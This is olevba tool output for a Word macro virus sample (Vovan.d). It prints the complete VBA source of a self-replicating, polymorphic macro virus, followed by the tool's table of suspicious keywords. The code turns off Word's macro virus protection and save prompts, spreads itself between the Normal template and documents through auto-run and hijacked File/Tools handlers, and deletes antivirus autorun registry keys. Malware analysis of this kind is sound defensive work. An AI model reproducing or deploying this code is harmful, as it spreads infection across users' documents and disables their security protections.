olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Vovan.d-0dc56e73bd61dd6e12b7483bd0a68c481ef66885
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Vovan.d-0dc56e73bd61dd6e12b7483bd0a68c481ef66885 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
krypton:
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If ActiveDocument.ReadOnly = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then NTinf = True
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then ATinf = True
If NTinf = True And ATinf = True Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
If NTinf = False Then
Set JI = NormalTemplate.VBProject.VBComponents(1).CodeModule
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
CI = .Lines(1, .CountOfLines)
End With
With JI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
End If
If Document = False Then
Set HI = ActiveDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
With HI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
End With
End If
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.Name = ActiveDocument.FullName Then End
If ActiveDocument.Saved = True Then GoTo 1 Else GoTo 2
1: Call Document_Open
2: ActiveDocument.Close
End Sub
Private Sub Document_New(): On Error Resume Next
Dim H: Randomize: H = Int((2 * Rnd) + 1)
If H = 1 Then GoTo 1
If H = 2 Then End
1: With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 193, "Sub FileOpen()": End With
Dim V: Randomize: V = Int((2 * Rnd) + 1): If V = 1 Then Call Mutation Else Call Antigen
Open "krypton.bas" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "krypton" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import ("krypton.bas")
Kill "krypton.bas"
Set ND = NormalTemplate.VBProject.VBComponents("krypton").CodeModule
With ThisDocument.VBProject.VBComponents(1).CodeModule
VC = .Lines(1, .CountOfLines)
End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Set SS = NormalTemplate.VBProject.VBComponents(1).CodeModule
With SS
.DeleteLines 1, .CountOfLines
End With
End Sub
Private Sub aaa()
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
On Error GoTo 1
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
.replaceline 193, "Sub xxx()": End With: Dim R: Randomize: R = Int((2 * Rnd) + 1): If R = 1 Then Call Mutation Else Call Antigen
Set ND = ThisDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
VC = .Lines(1, .CountOfLines): End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Application.OrganizerDelete NormalTemplate.FullName, "krypton", wdOrganizerObjectProjectItems
1: End Sub
Private Sub bbb()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
Dim S: Randomize: S = Int((2 * Rnd) + 1): If S = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End Sub
Private Sub ccc()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim P: Randomize: P = Int((2 * Rnd) + 1): If P = 1 Then Call Mutation Else Call Antigen
1: ActiveDocument.Save
End Sub
Private Sub ddd()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim T: Randomize: T = Int((2 * Rnd) + 1): If T = 1 Then Call Mutation Else Call Antigen
1: Dialogs(wdDialogFileSaveAs).Show
End Sub
Private Sub eee()
End Sub
Private Sub fff()
End Sub
Private Sub ggg()
Options.VirusProtection = 1
Dim W: Randomize: W = Int((2 * Rnd) + 1): If W = 1 Then Call Mutation Else Call Antigen
End Sub
Private Sub hhh()
On Error Resume Next: Options.VirusProtection = 1: Options.SaveNormalPrompt = 1
If Dialogs(wdDialogToolsOptions).Show Then
End If
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
End Sub
Private Sub iii()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
jXjX = Int(Rnd() * 15 + 1)
For Mutagen = 1 To jXjX
ZjZj = Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.CountOfLines
a = Rnd * 455: b = Rnd * 80: C = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.InsertLines ZjZj, "'" & a & vbTab & b & vbTab & C & vbTab & D & vbTab & e
Next Mutagen
End Sub
Private Sub kkk()
On Error Resume Next: WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Application.ScreenUpdating = 0: Application.ShowVisualBasicEditor = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
Dim C: Randomize: C = Int((2 * Rnd) + 1): If C = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Private Sub lll()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 2
1: For O = 1 To ActiveDocument.VBProject.VBComponents("krypton").CodeModule.CountOfLines
e = Mid(ActiveDocument.VBProject.VBComponents("krypton").CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ActiveDocument.VBProject.VBComponents("krypton").CodeModule.DeleteLines O, 1
Next O
GoTo 3
2: For O = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
e = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines O, 1
Next O
3:
End Sub
Rem
Rem                  MMM            MMMMMMMMM                 MM
Rem                MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
Rem                 MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMM        MMMMMMMMMMMMM           MMMMMMMMMM
Rem                  MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
Rem                   MM         MMMMMMMM               M  MMMMMMM
Rem                   MM        MMMMMMMMM             MMM   MMMMMM
Rem                            MMMMMMMMMMMMMM      MMMMM    MMMMMM
Rem                   MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
Rem                 MMMMMMMMMM                                MM
Rem
Rem                               CLASS<----->MODULE

'163,9571   66,07912    8,951941    76,12047    16,61564
'155.1797   65.39644    44.92301    27.13999    46.47184
'350.3782   27.91799    66.89333    176.529 20.60163
'184.6814   37.85266    62.08024    131.5903    6.205057
'274.4437   29.69988    145.8309    80.11719    15.62759
'209.5493   14.70623    41.1346 44.18858    41.31762
'363.4363   29.87785    42.04824    169.5462    14.73613
'329.082    71.70483    38.84999    7.887883    39.53069
'435.7095   29.89048    153.1638    71.76006    21.3161
'196.4927   44.89401    80.20324    114.1727    27.57722
'105.5832   43.79846    91.06363    141.7999    35.20638
'388.5746   48.1562 13.14965    163.2252    15.8997
'152.1205   56.29233    133.8543    72.46186    36.64165
'350.4249   77.31232    44.0137 106.9814    4.320534
'313.6666   26.01284    5.941448    41.53357    4.842751
'380.0715   43.28584    138.5046    .7039404    46.09143

-------------------------------------------------------------------------------
VBA MACRO krypton.bas 
in file: Virus.MSWord.Vovan.d-0dc56e73bd61dd6e12b7483bd0a68c481ef66885 - OLE stream: 'Macros/VBA/krypton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
krypton:
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If ActiveDocument.ReadOnly = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then NTinf = True
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then ATinf = True
If NTinf = True And ATinf = True Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
If NTinf = False Then
Set JI = NormalTemplate.VBProject.VBComponents(1).CodeModule
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
CI = .Lines(1, .CountOfLines)
End With
With JI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
End If
If Document = False Then
Set HI = ActiveDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
With HI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
End With
End If
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.Name = ActiveDocument.FullName Then End
If ActiveDocument.Saved = True Then GoTo 1 Else GoTo 2
1: Call Document_Open
2: ActiveDocument.Close
End Sub
Private Sub Document_New(): On Error Resume Next
Dim H: Randomize: H = Int((2 * Rnd) + 1)
If H = 1 Then GoTo 1
If H = 2 Then End
1: With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 193, "Sub FileOpen()": End With
Dim V: Randomize: V = Int((2 * Rnd) + 1): If V = 1 Then Call Mutation Else Call Antigen
Open "krypton.bas" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "krypton" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import ("krypton.bas")
Kill "krypton.bas"
Set ND = NormalTemplate.VBProject.VBComponents("krypton").CodeModule
With ThisDocument.VBProject.VBComponents(1).CodeModule
VC = .Lines(1, .CountOfLines)
End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Set SS = NormalTemplate.VBProject.VBComponents(1).CodeModule
With SS
.DeleteLines 1, .CountOfLines
End With
End Sub
Sub AutoExec()
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
On Error GoTo 1
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
.replaceline 193, "Sub xxx()": End With: Dim R: Randomize: R = Int((2 * Rnd) + 1): If R = 1 Then Call Mutation Else Call Antigen
Set ND = ThisDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
VC = .Lines(1, .CountOfLines): End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Application.OrganizerDelete NormalTemplate.FullName, "krypton", wdOrganizerObjectProjectItems
1: End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
Dim S: Randomize: S = Int((2 * Rnd) + 1): If S = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End Sub
Sub FileSave()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim P: Randomize: P = Int((2 * Rnd) + 1): If P = 1 Then Call Mutation Else Call Antigen
1: ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim T: Randomize: T = Int((2 * Rnd) + 1): If T = 1 Then Call Mutation Else Call Antigen
1: Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ViewVBcode()
End Sub
Sub ToolsMacro()
End Sub
Sub AutoExit()
Options.VirusProtection = 1
Dim W: Randomize: W = Int((2 * Rnd) + 1): If W = 1 Then Call Mutation Else Call Antigen
End Sub
Sub ToolsOptions()
On Error Resume Next: Options.VirusProtection = 1: Options.SaveNormalPrompt = 1
If Dialogs(wdDialogToolsOptions).Show Then
End If
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
End Sub
Sub Mutation()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
jXjX = Int(Rnd() * 15 + 1)
For Mutagen = 1 To jXjX
ZjZj = Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.CountOfLines
a = Rnd * 455: b = Rnd * 80: C = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.InsertLines ZjZj, "'" & a & vbTab & b & vbTab & C & vbTab & D & vbTab & e
Next Mutagen
End Sub
Sub FileOpen()
On Error Resume Next: WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Application.ScreenUpdating = 0: Application.ShowVisualBasicEditor = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
Dim C: Randomize: C = Int((2 * Rnd) + 1): If C = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub Antigen()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 2
1: For O = 1 To ActiveDocument.VBProject.VBComponents("krypton").CodeModule.CountOfLines
e = Mid(ActiveDocument.VBProject.VBComponents("krypton").CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ActiveDocument.VBProject.VBComponents("krypton").CodeModule.DeleteLines O, 1
Next O
GoTo 3
2: For O = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
e = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines O, 1
Next O
3:
End Sub
Rem
Rem                  MMM            MMMMMMMMM                 MM
Rem                MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
Rem                 MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMM        MMMMMMMMMMMMM           MMMMMMMMMM
Rem                  MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
Rem                   MM         MMMMMMMM               M  MMMMMMM
Rem                   MM        MMMMMMMMM             MMM   MMMMMM
Rem                            MMMMMMMMMMMMMM      MMMMM    MMMMMM
Rem                   MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
Rem                 MMMMMMMMMM                                MM
Rem
Rem                               CLASS<----->MODULE

'163,9571   66,07912    8,951941    76,12047    16,61564

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

